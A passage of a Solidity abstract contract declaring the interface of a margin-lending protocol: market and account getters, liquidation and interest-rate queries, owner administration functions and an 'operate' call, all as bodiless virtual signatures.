
    function getMarketPrice(uint256 marketId) public virtual returns (address);

    function owner() public virtual returns (address);

    function isOwner() public virtual returns (bool);

    function ownerWithdrawExcessTokens(uint256 marketId, address recipient)
        public
        virtual
        returns (uint256);

    function ownerAddMarket(
        address token,
        address priceOracle,
        address interestSetter,
        Decimal.D256 memory marginPremium,
        Decimal.D256 memory spreadPremium
    ) public
    virtual;

    function operate(
        Account.Info[] memory accounts,
        Actions.ActionArgs[] memory actions
    ) public
    virtual;

    function getMarketWithInfo(uint256 marketId)
        public
        virtual
        returns (
            Storage.Market memory,
            Interest.Index memory,
            Monetary.Price memory,
            Interest.Rate memory
        );

    function ownerSetMarginRatio(Decimal.D256 memory ratio) public virtual;

    function getLiquidationSpread() public virtual returns (Decimal.D256 memory);

    function getAccountWei(Account.Info memory account, uint256 marketId)
        public
        virtual
        returns (Types.Wei memory);

    function getMarketTotalPar(uint256 marketId)
        public
        virtual
        returns (Types.TotalPar memory);

    function getLiquidationSpreadForPair(
        uint256 heldMarketId,
        uint256 owedMarketId
    ) public virtual returns (Decimal.D256 memory);

    function getNumExcessTokens(uint256 marketId)
        public
        virtual
        returns (Types.Wei memory);

    function getMarketCachedIndex(uint256 marketId)
        public
        virtual
        returns (Interest.Index memory);

    function getAccountStatus(Account.Info memory account)
        public
        virtual
        returns (uint8);

    function getEarningsRate() public virtual returns (Decimal.D256 memory);

    function ownerSetPriceOracle(uint256 marketId, address priceOracle) public virtual;

    function getRiskLimits() public virtual returns (Storage.RiskLimits memory);

    function getMarket(uint256 marketId)
        public
        virtual
        returns (Storage.Market memory);

    function ownerSetIsClosing(uint256 marketId, bool isClosing) public virtual;

    function ownerSetGlobalOperator(address operator, bool approved) public virtual;

    function transferOwnership(address newOwner) public virtual;

    function getAdjustedAccountValues(Account.Info memory account)
        public
        virtual
        returns (Monetary.Value memory, Monetary.Value memory);

    function getMarketMarginPremium(uint256 marketId)
        public
        virtual
        returns (Decimal.D256 memory);

    function getMarketInterestRate(uint256 marketId)
        public
        virtual
        returns (Interest.Rate memory);
}